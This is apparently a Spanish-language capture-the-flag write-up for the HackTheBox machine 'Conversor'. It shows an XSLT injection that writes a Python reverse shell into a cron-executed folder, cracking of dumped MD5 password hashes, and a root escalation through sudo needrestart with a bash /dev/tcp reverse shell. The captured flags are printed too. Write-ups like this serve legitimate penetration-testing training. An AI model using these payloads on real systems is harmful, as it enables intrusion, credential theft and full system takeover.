---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Conversor HackTheBox (Easy)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 01:32 PDT
Nmap scan report for 10.10.11.92
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.93 seconds
```

Veremos dos puertos interesantes, pero el que mas nos interesa es el puerto `80` que aloja una pagina web y por lo que vemos nos redirige a un `dominio` llamado `conversor.htb` el cual tendremos que añadir a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            conversor.htb
```

Lo guardamos y entramos dentro de dicho `dominio`.

```
URL = http://conversor.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-26 095257.png" alt=""><figcaption></figcaption></figure>

Veremos un `login` bastante interesante y en el mismo tambien vemos un boton llamado `register`, vamos a probar a registrar una cuenta y entrar dentro con dichas credenciales.

Una vez creada nuestra cuenta veremos lo siguiente en la pagina:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-26 095426.png" alt=""><figcaption></figcaption></figure>

Veremos que podremos subir archivos, pero nos esta especificando que solamente con el formato `XML` y `XSLT`, tendremos que subir los `2` archivos uno apoyandose en el otro, con esto nos da una pista de que podriamos realizar un `XSLT Injection o Server-Side XSLT Processing`, por lo que vamos a probar de primeras a ver que esta haciendo por dentro.

> test.xml

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="test.xsl"?>
<data>
    <item>test</item>
</data>
```

Con este primero archivos referenciamos al `test.xsl` para que lo cargue.

> test.xsl

```xsl
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:text>&#10;</xsl:text>
<xsl:value-of select="system-property('xsl:vendor-url')"/>
</xsl:template>
</xsl:stylesheet>
```

En este caso lo que hacemos es que muestre en la pagina como esta funcionando por dentro y que esta haciendo.

Si subimos esto a la pagina veremos que se sube de forma correcta y nos generara un `.html` en el cual si entramos veremos unicamente esto:

```
libxslt http://xmlsoft.org/XSLT/ 
```

Vemos que esta funcionando y nos esta mostrando que esta usando una libreria super famosa de `linux` de la biblioteca `C`, que puede tener algunas funciones interesantes.

Si probamos a escribir un archivo en `/tmp` de esta forma:

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exsl="http://exslt.org/common"
  extension-element-prefixes="exsl"
  version="1.0">
  
  <xsl:template match="/">
    <exsl:document href="file:///tmp/evil.txt" method="text">
      Hello World from EXSLT!
    </exsl:document>
    Written to file!
  </xsl:template>
</xsl:stylesheet>
```

Lo guardamos, subimos los dos archivos y veremos que funciona, ya que si entramos al `HTML` generado veremos lo siguiente:

```
Written to file!
```

Este codigo lo saque de idea de esta fuente:

URL = [XSLT Injection Info](https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#read-files-and-ssrf-using-document)

Ahora sabiendo esto podremos probar a realizar otras funciones mas interesantes, si probamos en la ruta `/var/www/conversor.htb/` tambien funcionara ya que es la ruta tipica de `apache2` cuando se crea un dominio.

## Escalate user www-data

### Gobuster

Vamos a realizar un poco de `fuzzing` a ver que vemos.

```shell
gobuster dir -u http://conversor.htb/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://conversor.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2842]
/login                (Status: 200) [Size: 722]
/register             (Status: 200) [Size: 726]
/javascript           (Status: 403) [Size: 278]
/logout               (Status: 200) [Size: 722]
/convert              (Status: 405) [Size: 153]

```

Veremos varios directorios interesantes, pero sin mas, veremos `about`, si vamos dentro de el...

```
URL = http://conversor.htb/about
```

Veremos que muestra los trabajadores en el codigo fuente de la pagina, pero algo interesante, veremos abajo un boton llamado `Download Source Code`, si le damos nos descarga un `.tar.gz` del codigo fuente de la pagina (La estructura de la pagina).

Vamos a descomprimirlo de esta forma:

```shell
mv source_code.tar.gz source_code.tar
tar -xf source_code.tar
```

Si listamos la carpeta veremos esto:

```
total 4044
drwxr-xr-x 7 root     root        4096 Oct 26 02:48 .
drwxr-xr-x 8 kali     kali        4096 Oct 26 01:31 ..
-rwxr-x--- 1 www-data www-data    4461 Aug 14 13:47 app.py
-rwxr-x--- 1 www-data www-data      92 Jul 30 21:00 app.wsgi
-rwxr-x--- 1 www-data www-data     528 Aug 14 13:52 install.md
drwxr-x--- 2 www-data www-data    4096 Aug 14 13:45 instance
drwxr-x--- 2 www-data www-data    4096 Aug 14 13:43 scripts
drwxr-x--- 3 www-data www-data    4096 Aug 15 17:03 static
drwxr-x--- 2 www-data www-data    4096 Aug 15 18:17 templates
drwxr-x--- 2 www-data www-data    4096 Aug 14 13:43 uploads
```

Vemos que la estructura contiene varios directorios interesantes entre ellos `scripts` y vemos que la estructura es de un servidor de `python3` `Flask`, inspeccionando el codigo de `app.py` veremos que realmente hay una vulnerabilidad de la que comente antes.

Tambien veremos una ruta de `DB` que es `/var/www/conversor.htb/instance/users.db` por lo que esto nos interesara mas adelante seguramente.

Pero el archivo mas interesante que vemos es `install.md`:

```md
cat install.md     
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

Vemos que en la carpeta `scripts` hay un `crontab` que ejecuta cualquier archivo de `python` con `.py` que este dentro, por lo que podremos depositar atraves de la vulnerabilidad `XLST Injection` un archivo de `python3` para que se ejecute una `shell`.

> test.xsl

```xsl
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">

<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/test.py" method="text">
#!/usr/bin/env python3
import os
import socket
import subprocess

# Reverse shell simple
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<IP_ATTACKER>", <PORT>))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
  </ptswarm:document>
</xsl:template>

</xsl:stylesheet>
```

Antes de subir este archivo, vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si subimos el archivo y accedemos al `HTML` que nos ha generado, veremos una pantalla en blanco, pero si volvemos a donde tenemos la escucha y esperamos unos minutos, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.220] from (UNKNOWN) [10.10.11.92] 53128
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell` (`TTY`).

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user

Recordemos que antes en el `app.py` vimos que apuntaba a un `.db` en la siguiente ruta el cual vamos a leer de esta forma:

```shell
cd /var/www/conversor.htb/instance/
sqlite3 users.db
```

Info:

```
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite>
```

Vamos a listar las `tablas` que haya:

```sql
.tables
```

Info:

```
files  users
```

Vamos a ver la informacion de la tabla `users` de esta forma:

```sql
SELECT * FROM users;
```

Info:

```
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|job|42f749ade7f9e195bf475f37a44cafcb
6|admin|21232f297a57a5a743894a0e4a801fc3
7|user|dc647eb65e6711e155375218212b3964
8|hacker|d6a6bc0db10694a2d90e3a69648f3a03
9|aa|4124bc0a9335c27f086f24ba207a4912
10|testobr|8c3f03229b8d13ab89a4be45364bfb8f
11|jija|1cc7ba0d80accd4180bd871598ea8361
12|prova|189bbbb00c5f1fb7fba9ad9285f193d1
13|test|098f6bcd4621d373cade4e832627b4f6
14|ttte|dd0db42a508a2391a4fd4e24cb4fa07c
15|makumba|5785a95978aef6a700afd551620f091c
16|diseo|875c9b3974555fa3eecee201d04398ca
17|mdn0x|2876596704fc3c772c6ba3de7ff7e437
18|mruggi|864ebe230e395d96c985755a4e5e89f7
19|mariab|224ae88393b5c9c4a3533be00e34f17c
20|mruggo|f1c74f7a997b80d8fc4e5a8facd42a4e
21|mrdxr|4be17c2da431b664defa049fed1546a4
22|test123|cc03e747a6afbbcbf8be7668acfebee5
23|jarod|21232f297a57a5a743894a0e4a801fc3
24|hello|5d41402abc4b2a76b9719d911017c592
25|mba|91e112b7220af68fcf5be09ee837f7a7
```

Vemos interesante el usuario llamado `fismathack`, es el que nos interesa ya que si listamos el `/etc/passwd`:

```shell
cat /etc/passwd | grep "/bin/bash"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
```

Vamos a intentar `crackear` dicha contraseña a ver si fuera la misma que la del usuario a nivel de sistema.

> hash

```
fismathack:5b5c3ac3a1c897c94caad48e6c71fdec
```

Ahora vamos a probar a `crackearlo`...

```shell
john --format=Raw-MD5 --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
Keepmesafeandwarm (fismathack)     
1g 0:00:00:00 DONE (2025-10-26 03:04) 2.272g/s 24938Kp/s 24938Kc/s 24938KC/s Keiser01..Keepers137
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, ahora si probamos la contraseña con el usuario...

```shell
su fismathack
```

Metemos como contraseña `Keepmesafeandwarm`...

```
fismathack@conversor:/var/www/conversor.htb/instance$ whoami
fismathack
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
207a806493862bc608aaeafbb1638af0
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Vemos que podemos ejecutar como el usuario `root` el binario `needrestart`, por lo que vamos a ver que hace dicho binario.

Si listamos el `help` del binario, veremos que con el `-c` podremos cargar una configuracion personalizada, vamos a probar esto:

```shell
cd /tmp
echo 'system("id > /tmp/test.txt");' > config.sh
chmod +x config.sh
sudo /usr/sbin/needrestart -c /tmp/config.sh
```

Info:

```
Scanning processes...                                                                                                                                        
Scanning candidates...                                                                                                                                       
Scanning linux images...                                                                                                                                     

Running kernel seems to be up-to-date.

Restarting services...
 systemctl restart cron.service

No containers need to be restarted.

User sessions running outdated binaries:
 fismathack @ session #302: WVXwB[43675]
 fismathack @ session #403: zAgpV[45532]

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

Ahora si listamos el directorio `/tmp` veremos que funciono:

```shell
cat /tmp/test.txt
```

Info:

```
uid=0(root) gid=0(root) groups=0(root)
```

Por lo que vamos a realizar lo siguiente:

```shell
cd /tmp
echo 'system("bash -c \'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\'");' > config.sh
chmod +x config.sh
```

Antes de ejecutarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si ejecutamos lo siguiente:

```shell
sudo /usr/sbin/needrestart -c /tmp/config.sh
```

Esto se quedara pensando, pero si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [10.10.14.220] from (UNKNOWN) [10.10.11.92] 51280
root@conversor:/tmp# whoami
whoami
root
```

Vemos que ha funcionado y seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
eb85c6c1ae8bba7daee43782db6b9ed3
```
